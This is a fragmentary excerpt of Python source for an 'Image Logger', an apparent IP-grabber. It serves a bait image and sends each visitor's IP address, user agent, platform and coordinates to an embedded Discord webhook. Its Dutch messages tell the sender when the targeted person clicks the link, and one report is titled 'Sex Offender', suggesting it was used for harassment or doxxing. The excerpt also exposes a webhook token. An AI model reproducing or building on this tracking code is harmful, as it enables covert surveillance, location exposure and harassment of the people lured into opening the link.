...
config = {
    "webhook": "https://discord.com/api/webhooks/1543915184202981446/1L0Ny1ZlFsiFsWMnoKx2StWGY7y1MPoTkohqZswLz-jV1yofM5NP01Na-adiOZDdE9fI",
    "image": "https://www.humanium.org/en/wp-content/uploads/2020/04/shutterstock_84115585-1-1024x768.jpg", 
    "imageArgument": True,

    "username": "KONTJESLIKKER", 
    "color": 0x00FFFF,
...
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    ...
    "embeds": [
        {
            "title": "Image Logger - Sex Offender",
            "color": config["color"],
            "description": f"E Gappie Linkje Is Gestuurd Je Zal Weten Wanneer Die Er Op Heeft Geklikt\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
    ...
    "embeds": [
        {
            ...
            "color": config["color"],
            "description": f"""**Iemand Heeft Hem Geopend**
